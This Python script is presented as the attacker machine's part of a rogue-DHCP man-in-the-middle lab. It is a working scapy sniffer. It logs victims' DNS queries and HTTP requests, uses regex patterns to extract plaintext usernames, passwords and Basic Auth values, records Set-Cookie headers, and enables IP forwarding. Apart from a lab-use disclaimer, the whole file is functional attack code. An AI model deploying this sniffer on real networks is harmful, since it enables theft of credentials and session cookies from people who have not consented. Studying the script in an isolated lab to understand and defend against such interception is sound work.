#!/usr/bin/env python3
"""
mitm_sniffer.py — MITM Traffic Interceptor (Machine 2 — Attacker)
==================================================================
After a victim has accepted the rogue DHCP offer (gateway = attacker),
all victim traffic flows through this machine. This script captures
and logs:
  • DNS queries (plaintext)
  • HTTP requests and responses (including credentials in POST bodies)
  • Any plaintext credentials (Basic Auth, form data)

Requires IP forwarding enabled on the attacker:
    echo 1 > /proc/sys/net/ipv4/ip_forward

⚠️  FOR EDUCATIONAL / LAB USE ONLY.
"""

import re
import os
from datetime import datetime

from scapy.all import sniff, Ether, IP, TCP, UDP, DNS, DNSQR, Raw, conf

from config import ATTACKER_IF, MITM_CAPTURE_FILE, HTTP_PORT, DNS_PORT
from utils import get_logger, print_banner

log = get_logger("MITM-SNIFFER")


# ─────────────────────────────────────────────
# CREDENTIAL PATTERNS (HTTP plaintext)
# ─────────────────────────────────────────────

CRED_PATTERNS = [
    re.compile(rb"(?i)(user(?:name)?|login|email)\s*=\s*([^&\r\n]+)"),
    re.compile(rb"(?i)(pass(?:word)?|passwd|pwd)\s*=\s*([^&\r\n]+)"),
    re.compile(rb"Authorization:\s*Basic\s+([A-Za-z0-9+/=]+)", re.IGNORECASE),
]

# ─────────────────────────────────────────────
# CAPTURE LOG
# ─────────────────────────────────────────────

class CaptureLog:
    def __init__(self, path: str = MITM_CAPTURE_FILE):
        self.path = path
        self._counts = {"dns": 0, "http": 0, "creds": 0}

    def write(self, category: str, msg: str) -> None:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        line      = f"[{timestamp}]  [{category.upper():6s}]  {msg}"
        log.info(line)
        try:
            with open(self.path, "a") as f:
                f.write(line + "\n")
        except OSError:
            pass
        self._counts[category.lower()] = self._counts.get(category.lower(), 0) + 1

    @property
    def stats(self):
        return dict(self._counts)


capture_log = CaptureLog()


# ─────────────────────────────────────────────
# PACKET HANDLERS
# ─────────────────────────────────────────────

def handle_dns(pkt) -> None:
    """Extract DNS query names."""
    if DNS in pkt and pkt[DNS].qr == 0:   # query (not response)
        src_ip  = pkt[IP].src if IP in pkt else "?"
        queries = []
        if pkt[DNS].qdcount > 0:
            qd = pkt[DNS].qd
            while qd:
                queries.append(qd.qname.decode(errors="replace").rstrip("."))
                qd = qd.payload if hasattr(qd, "payload") else None
        if queries:
            for q in queries:
                capture_log.write("DNS", f"{src_ip}  queried  {q}")


def handle_http(pkt) -> None:
    """Parse HTTP requests and look for credentials."""
    if Raw not in pkt or IP not in pkt:
        return

    payload = bytes(pkt[Raw].load)
    src_ip  = pkt[IP].src
    dst_ip  = pkt[IP].dst

    # HTTP request line
    if payload.startswith(b"GET ") or payload.startswith(b"POST ") or \
       payload.startswith(b"PUT ") or payload.startswith(b"DELETE "):

        lines  = payload.split(b"\r\n")
        req_line = lines[0].decode(errors="replace")
        host     = ""
        for line in lines[1:]:
            if line.lower().startswith(b"host:"):
                host = line[5:].strip().decode(errors="replace")
                break

        capture_log.write(
            "HTTP",
            f"{src_ip} → {dst_ip}  {req_line}  Host: {host}"
        )

        # Credential extraction
        for pattern in CRED_PATTERNS:
            matches = pattern.findall(payload)
            for m in matches:
                if isinstance(m, tuple):
                    field, value = m[0], m[1]
                else:
                    field, value = b"auth", m
                capture_log.write(
                    "CREDS",
                    f"CREDENTIAL FOUND  {src_ip} → {dst_ip}  "
                    f"{field.decode(errors='replace')} = "
                    f"{value.decode(errors='replace')}"
                )

    # HTTP response (look for Set-Cookie, interesting headers)
    elif payload.startswith(b"HTTP/"):
        lines = payload.split(b"\r\n")
        status = lines[0].decode(errors="replace")
        for line in lines[1:10]:   # scan first 10 headers
            if line.lower().startswith(b"set-cookie:"):
                capture_log.write(
                    "HTTP",
                    f"COOKIE  {src_ip} ← {dst_ip}  "
                    f"{line.decode(errors='replace')}"
                )


def packet_handler(pkt) -> None:
    """Route each packet to the appropriate handler."""
    try:
        # DNS
        if UDP in pkt and (pkt[UDP].dport == DNS_PORT or pkt[UDP].sport == DNS_PORT):
            handle_dns(pkt)

        # HTTP
        if TCP in pkt and (pkt[TCP].dport == HTTP_PORT or pkt[TCP].sport == HTTP_PORT):
            handle_http(pkt)

    except Exception as e:
        log.debug(f"Packet handler error: {e}")


# ─────────────────────────────────────────────
# ENABLE IP FORWARDING
# ─────────────────────────────────────────────

def enable_ip_forwarding() -> None:
    ret = os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    if ret == 0:
        log.info("[MITM] IP forwarding enabled")
    else:
        log.warning("[MITM] Could not enable IP forwarding automatically — run as root")


# ─────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────

def run(iface: str = ATTACKER_IF) -> None:
    print_banner("MITM TRAFFIC SNIFFER  (Machine 2 — Attacker)")
    enable_ip_forwarding()

    log.warning(
        f"Sniffing on '{iface}'\n"
        f"  Capturing  : DNS queries + HTTP traffic + credentials\n"
        f"  Output file: {MITM_CAPTURE_FILE}\n"
        f"  NOTE: Victim must have accepted rogue DHCP offer first"
    )

    sniff(
        iface=iface,
        filter=(
            f"(udp port {DNS_PORT}) or "
            f"(tcp port {HTTP_PORT})"
        ),
        prn=packet_handler,
        store=False,
    )


if __name__ == "__main__":
    import sys

    iface = sys.argv[1] if len(sys.argv) > 1 else ATTACKER_IF
    try:
        run(iface)
    except KeyboardInterrupt:
        log.info(f"Sniffer stopped.  Stats: {capture_log.stats}")
